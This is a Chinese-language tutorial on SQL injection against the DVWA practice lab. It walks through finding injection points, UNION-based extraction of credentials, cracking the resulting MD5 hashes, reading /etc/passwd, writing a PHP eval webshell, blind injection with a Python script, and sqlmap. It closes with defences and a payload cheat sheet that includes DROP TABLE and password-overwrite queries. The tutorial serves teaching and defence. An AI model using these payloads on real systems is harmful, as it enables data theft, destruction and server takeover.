---
title: SQL注入
date: 2026-07-15
tags: [sql注入,DVWA]
---

# SQL 注入完整渗透测试流程

SQL 注入（SQL Injection）是一种常见的网络攻击手段，攻击者通过在输入字段或请求中注入恶意的 SQL 语句，操控数据库执行意图之外的操作。

---

## 阶段一：判断注入点（找漏洞）

### 1.1 判断是否存在 SQL 注入

**目标**：确认输入参数是否直接拼接到 SQL 查询中

**测试方法**：

| 输入 | 预期行为 | 说明 |
|------|---------|------|
| `1` | 正常返回数据 | 基线测试 |
| `1'` | 报错或异常 | 单引号破坏 SQL 语法 |
| `1' and '1'='1` | 正常返回数据 | 恒真条件，闭合引号 |
| `1' and '1'='2` | 无数据或异常 | 恒假条件 |

**DVWA 实操**：
```
正常输入：1
测试输入：1'
```

如果看到类似 `You have an error in your SQL syntax` 的报错，或者页面显示异常，说明**存在注入点**。

---

### 1.2 判断注入类型

**数字型注入**（参数直接拼接，无引号包裹）：
```sql
SELECT * FROM users WHERE id = 1
```
测试 payload：`1 and 1=1` vs `1 and 1=2`

**字符型注入**（参数用单引号包裹）：
```sql
SELECT * FROM users WHERE id = '1'
```
测试 payload：`1' and '1'='1` vs `1' and '1'='2`

**搜索型注入**（参数在 LIKE 中）：
```sql
SELECT * FROM users WHERE name LIKE '%input%'
```
测试 payload：`%' and 1=1 and '%'='`

**DVWA Low 级别是字符型注入**，所以后续 payload 都要用 `'` 闭合。

---

## 阶段二：信息收集（探测数据库结构）

### 2.1 判断列数（Order By）

**目标**：确定当前 SQL 查询返回多少列，为后续 UNION 注入做准备

**方法**：用 `ORDER BY` 逐步增加列号，直到报错

```
1' order by 1-- -     ✅ 正常
1' order by 2-- -     ✅ 正常
1' order by 3-- -     ❌ 报错：Unknown column '3' in 'order clause'
```

**结论**：当前查询有 **2 列**

**注释符说明**：
- `-- -`（两个减号+空格+减号）：MySQL 注释，`--` 后必须有空格
- `#`：也可以用，但在 URL 中需要编码成 `%23`

---

### 2.2 找回显位（Union Select）

**目标**：确定哪些列的数据会显示在页面上

**原理**：用 UNION 联合查询，让第一个查询返回空结果，第二个查询的数据就会显示

```
1' union select 1,2-- -
```

**页面显示**：
```
First name: 1
Surname: 2
```

**结论**：第 1 列和第 2 列都有回显，可以用来输出数据。

**为什么第一个查询要返回空？**
```
-1' union select 1,2-- -
```
用 `-1` 或不存在的 ID，让第一个查询无结果，UNION 后的数据才会显示。

---

### 2.3 获取数据库基本信息

**目标**：探测数据库版本、当前用户、当前数据库名

**Payload**：
```
-1' union select version(),database()-- -
```

**预期输出**：
```
First name: 8.0.12
Surname: dvwa1
```

**常用信息查询函数**：

| 函数 | 作用 |
|------|------|
| `version()` | MySQL 版本 |
| `database()` | 当前数据库名 |
| `user()` | 当前用户 |
| `@@datadir` | 数据库文件路径 |
| `@@version_compile_os` | 操作系统 |

---

### 2.4 获取所有数据库名

**目标**：查出 MySQL 里所有数据库

**Payload**：
```
-1' union select null,group_concat(schema_name) from information_schema.schemata-- -
```

**预期输出**：
```
information_schema,mysql,performance_schema,dvwa1,test
```

**关键点**：
- `information_schema` 是 MySQL 的系统库，存储所有数据库/表/列的元数据
- `group_concat()` 把多行结果拼成一行，避免只显示第一条

---

### 2.5 获取指定数据库的表名

**目标**：查出 `dvwa1` 库里有哪些表

**Payload**（方法一，用单引号）：
```
-1' union select null,group_concat(table_name) from information_schema.tables where table_schema='dvwa1'-- -
```

**Payload（方法二，用十六进制绕过字符集问题）**：
```
-1' union select null,group_concat(table_name) from information_schema.tables where table_schema=0x6476776131-- -
```

**十六进制转换**：
- 打开 Burp → Decoder
- 输入 `dvwa1` → Encode as → Hex → 得到 `6476776131`
- 加前缀 `0x` → `0x6476776131`

**预期输出**：
```
guestbook,users
```

**结论**：目标表是 `users`

---

### 2.6 获取指定表的列名

**目标**：查出 `users` 表有哪些字段

**Payload**：
```
-1' union select null,group_concat(column_name) from information_schema.columns where table_schema=0x6476776131 and table_name=0x7573657273-- -
```

**十六进制对照**：
- `dvwa1` → `0x6476776131`
- `users` → `0x7573657273`

**预期输出**：
```
user_id,first_name,last_name,user,password,avatar,last_login,failed_login,role
```

**重点字段**：`user`（用户名）、`password`（密码哈希）

---

## 阶段三：数据提取（脱库）

### 3.1 提取用户名和密码

**Payload**：
```
-1' union select null,group_concat(user,0x3a,password) from users-- -
```

**说明**：
- `0x3a` 是冒号 `:` 的十六进制，用来分隔用户名和密码
- `group_concat()` 把所有用户拼成一行

**预期输出**：
```
admin:5f4dcc3b5aa765d61d8327deb882cf99,gordonb:e99a18c428cb38d5f260853678922e03,1337:8d3533d75ae2c3966d7e0d4fcc69216b
```

---

### 3.2 分行提取（清晰显示）

**Payload**（用 `<br>` 分隔）：
```
-1' union select null,group_concat(user,0x3a,password separator '<br>') from users-- -
```

**预期输出**（HTML 渲染后）：
```
admin:5f4dcc3b5aa765d61d8327deb882cf99
gordonb:e99a18c428cb38d5f260853678922e03
1337:8d3533d75ae2c3966d7e0d4fcc69216b
pablo:0d107d09f5bbe40cade3de5c71e9e9b7
smithy:5f4dcc3b5aa765d61d8327deb882cf99
```

---

### 3.3 破解密码哈希

**识别哈希类型**：32 位十六进制 → **MD5**

**在线破解**：
- [CMD5](https://www.cmd5.com/)
- [CrackStation](https://crackstation.net/)
- [MD5 Decrypt](https://md5decrypt.net/)

**本地破解（Hashcat）**：
```bash
# 保存哈希到文件
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt

# 使用字典破解（-m 0 表示 MD5）
hashcat -m 0 hash.txt rockyou.txt
```

**破解结果**：
```
admin → password
gordonb → abc123
1337 → charley
```

---

## 阶段四：进阶技巧

### 4.1 读取文件（Load_file）

**前提条件**：
- 当前用户有 `FILE` 权限
- 知道文件绝对路径
- `secure_file_priv` 未限制

**Payload（读取 `/etc/passwd`）**：
```
-1' union select null,load_file('/etc/passwd')-- -
```

**Windows 路径**（双反斜杠或单斜杠）：
```
-1' union select null,load_file('c:/windows/system.ini')-- -
```

---

### 4.2 写入 Webshell（Into Outfile）

**前提条件**：

- 有 `FILE` 权限
- 知道 Web 根目录路径
- `secure_file_priv` 允许写入

**Payload（写入一句话木马）**：

```
-1' union select null,'<?php @eval($_POST["cmd"]); ?>' into outfile 'c:/phpstudy/www/dvwa/shell.php'-- -
```

**访问木马**：
```
http://127.0.0.1/dvwa/shell.php
```

**用 Webshell 管理工具连接**（蚁剑/冰蝎/哥斯拉）：
- URL: `http://127.0.0.1/dvwa/shell.php`
- 密码: `cmd`

---

### 4.3 绕过 WAF 和过滤

#### Medium 级别（mysqli_real_escape_string 过滤）

**过滤规则**：转义单引号 `'` → `\'`

**绕过方法**：利用数字型注入点，或使用宽字节注入

**DVWA Medium 特点**：下拉框提交，抓包改参数

```
Burp 抓包 → 改 id=1 为：
id=1 union select null,database()
```

---

#### High 级别（弹窗输入 + Session 验证）

**过滤规则**：
- 限制输入长度
- 使用 `LIMIT 1` 限制返回行数

**绕过方法**：
```
1' union select null,database()#
```

**关键**：用 `#` 注释掉后面的 `LIMIT 1`

---

### 4.4 布尔盲注（无回显数据）

**场景**：页面只显示"成功"或"失败"，不显示具体数据

**判断数据库名长度**：
```
1' and length(database())=5-- -   → 成功
1' and length(database())=6-- -   → 失败
```

**逐字符猜解数据库名**：

```sql
1' and substr(database(),1,1)='d'-- -   → 成功
1' and substr(database(),2,1)='v'-- -   → 成功
1' and substr(database(),3,1)='w'-- -   → 成功
```

**自动化脚本**（Python）：

```python
import requests

url = "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/"
cookies = {"PHPSESSID": "your_session_id", "security": "low"}

db_name = ""
for i in range(1, 20):
    for c in "abcdefghijklmnopqrstuvwxyz0123456789_":
        payload = f"1' and substr(database(),{i},1)='{c}'-- -"
        r = requests.get(url, params={"id": payload, "Submit": "Submit"}, cookies=cookies)
        if "exists" in r.text:
            db_name += c
            print(f"[+] {db_name}")
            break
    else:
        break

print(f"[*] Database: {db_name}")
```

---

### 4.5 时间盲注（完全无回显）

**场景**：页面无论输入什么都返回相同内容

**利用 `SLEEP()` 函数**：
```sql
1' and if(length(database())=5, sleep(3), 0)-- -
```

**判断逻辑**：
- 如果条件为真，页面延迟 3 秒响应
- 如果条件为假，立即响应

**Burp Intruder 时间盲注**：
1. Payload 设置：`1' and if(substr(database(),§1§,1)='§a§', sleep(2), 0)-- -`
2. 在 Columns 里添加 `Response received` 列
3. 筛选响应时间 > 2000ms 的请求
4. 对应的字符就是正确的

---

## 阶段五：工具化测试（Sqlmap）

### 5.1 基础扫描

**直接扫描 URL**：
```bash
sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=your_session; security=low" --dbs
```

**参数说明**：
- `-u`：目标 URL
- `--cookie`：会话 Cookie（必须登录后才能访问 DVWA 页面）
- `--dbs`：枚举所有数据库

---

### 5.2 指定数据库和表

**枚举 dvwa1 的表**：
```bash
sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=your_session; security=low" -D dvwa1 --tables
```

**枚举 users 表的列**：

```bash
sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=your_session; security=low" -D dvwa1 -T users --columns
```

**脱取 user 和 password 字段**：
```bash
sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=your_session; security=low" -D dvwa1 -T users -C user,password --dump
```

---

### 5.3 从 Burp 导入请求

**步骤**：
1. Burp 抓包后，右键 → **Copy to file** → 保存为 `request.txt`
2. 用 sqlmap 读取：
```bash
sqlmap -r request.txt --dbs
```

**优点**：自动处理 POST 参数、Cookie、Header

---

### 5.4 高级选项

**指定注入参数**：
```bash
sqlmap -u "http://example.com/page?id=1&name=test" -p id
```

**指定注入技术**：
```bash
sqlmap -u "http://example.com/page?id=1" --technique=BEUST
```
- B: Boolean-based blind（布尔盲注）
- E: Error-based（报错注入）
- U: Union query（联合查询）
- S: Stacked queries（堆叠查询）
- T: Time-based blind（时间盲注）

**绕过 WAF**：

```bash
sqlmap -u "http://example.com/page?id=1" --tamper=space2comment --random-agent
```

---

## 阶段六：防御与修复

### 6.1 漏洞成因

**不安全的代码**（PHP 示例）：
```php
$id = $_GET['id'];
$query = "SELECT * FROM users WHERE id = '$id'";
$result = mysqli_query($conn, $query);
```

**问题**：用户输入 `$id` 直接拼接到 SQL 查询中，未做任何过滤。

---

### 6.2 防御方法

#### 方法一：预编译语句（最安全）

```php
$id = $_GET['id'];
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $id);  // "i" 表示整数类型
$stmt->execute();
$result = $stmt->get_result();
```

**原理**：SQL 语句和参数分离，数据库先编译 SQL 结构，再填充参数，用户输入无法改变 SQL 逻辑。

---

#### 方法二：输入验证

```php
$id = $_GET['id'];
if (!is_numeric($id)) {
    die("Invalid input");
}
$query = "SELECT * FROM users WHERE id = $id";
```

**适用场景**：数字型参数

---

#### 方法三：转义特殊字符

```php
$id = mysqli_real_escape_string($conn, $_GET['id']);
$query = "SELECT * FROM users WHERE id = '$id'";
```

**局限性**：在某些字符集下可以被绕过（宽字节注入）

---

### 6.3 最佳实践

1. **永远使用参数化查询**（预编译）
2. **最小权限原则**：Web 应用连接数据库的用户不应有 `FILE`、`DROP`、`CREATE` 等高危权限
3. **输入验证 + 白名单**：数字参数用 `is_numeric()`，字符串参数用白名单匹配
4. **错误信息不暴露**：生产环境关闭数据库报错显示
5. **WAF 防护**：部署 ModSecurity 等 Web 应用防火墙

---

## 阶段七：渗透测试报告模板

### 7.1 漏洞标题
```
SQL 注入漏洞 - DVWA 用户查询功能
```

---

### 7.2 漏洞等级
**高危**（可直接获取数据库敏感数据）

---

### 7.3 漏洞描述
```
目标系统的用户 ID 查询功能存在 SQL 注入漏洞，攻击者可通过构造恶意输入，
执行任意 SQL 查询，获取数据库中的敏感信息（用户名、密码哈希等）。
```

---

### 7.4 漏洞位置
```
URL: http://127.0.0.1/dvwa/vulnerabilities/sqli/
参数: id
请求方式: GET
```

---

### 7.5 复现步骤

**步骤一：判断注入点**
```
输入: 1'
响应: SQL 语法错误
结论: 存在字符型注入
```

**步骤二：判断列数**
```
Payload: 1' order by 2-- -
响应: 正常
Payload: 1' order by 3-- -
响应: Unknown column '3' in 'order clause'
结论: 当前查询有 2 列
```

**步骤三：获取数据库信息**
```
Payload: -1' union select version(),database()-- -
响应:
  First name: 8.0.12
  Surname: dvwa1
```

**步骤四：提取敏感数据**
```
Payload: -1' union select null,group_concat(user,0x3a,password) from users-- -
响应:
  admin:5f4dcc3b5aa765d61d8327deb882cf99
  gordonb:e99a18c428cb38d5f260853678922e03
```

---

### 7.6 漏洞影响
1. **数据泄露**：可获取所有用户账号密码
2. **权限提升**：破解管理员密码后可接管系统
3. **数据篡改**：可执行 `UPDATE`、`DELETE` 等操作（取决于数据库权限）
4. **服务器入侵**：可写入 Webshell 获取服务器权限（需要 FILE 权限）

---

### 7.7 修复建议

**临时方案**：
1. 关闭该功能或限制访问 IP

**永久方案**：
1. 使用预编译语句（PDO/mysqli prepare）
2. 对输入参数进行严格类型校验（数字型用 `is_numeric()`）
3. 数据库账号使用最小权限原则（禁用 FILE 权限）
4. 部署 WAF 并配置 SQL 注入规则

---

### 7.8 修复后的代码示例

**修复前**：
```php
$id = $_GET['id'];
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
```

**修复后**：
```php
$id = $_GET['id'];
$stmt = $conn->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();
$result = $stmt->get_result();
```

---

## 附录：常用 Payload 速查表

### 判断注入点
```
1' and '1'='1       → 正常
1' and '1'='2       → 异常
1' or '1'='1        → 返回所有数据
```

---

### 联合查询
```
-1' union select null,null-- -
-1' union select version(),database()-- -
-1' union select null,group_concat(schema_name) from information_schema.schemata-- -
-1' union select null,group_concat(table_name) from information_schema.tables where table_schema=database()-- -
-1' union select null,group_concat(column_name) from information_schema.columns where table_name=0x7573657273-- -
```

---

### 报错注入
```
1' and extractvalue(1,concat(0x7e,database()))-- -
1' and updatexml(1,concat(0x7e,database()),1)-- -
```

---

### 布尔盲注
```
1' and length(database())>5-- -
1' and substr(database(),1,1)='d'-- -
1' and ascii(substr(database(),1,1))>100-- -
```

---

### 时间盲注
```
1' and if(1=1,sleep(3),0)-- -
1' and if(length(database())=5,sleep(3),0)-- -
```

---

### 堆叠查询（权限高时可用）
```
1'; DROP TABLE users;-- -
1'; UPDATE users SET password='new_hash' WHERE user='admin';-- -
```

---

## 学习检查清单

完成以下所有项，说明你已经掌握 SQL 注入的完整流程：

- [ ] 能手工判断注入点（数字型/字符型）
- [ ] 能手工判断列数并找到回显位
- [ ] 能手工提取数据库名、表名、列名
- [ ] 能手工脱取用户名和密码
- [ ] 能破解 MD5 哈希
- [ ] 理解 `information_schema` 的作用
- [ ] 理解 UNION 注入的原理
- [ ] 能在 Medium 级别绕过基础过滤
- [ ] 理解布尔盲注和时间盲注的区别
- [ ] 能用 sqlmap 自动化测试
- [ ] 能写出规范的渗透测试报告
- [ ] 理解预编译语句的防御原理

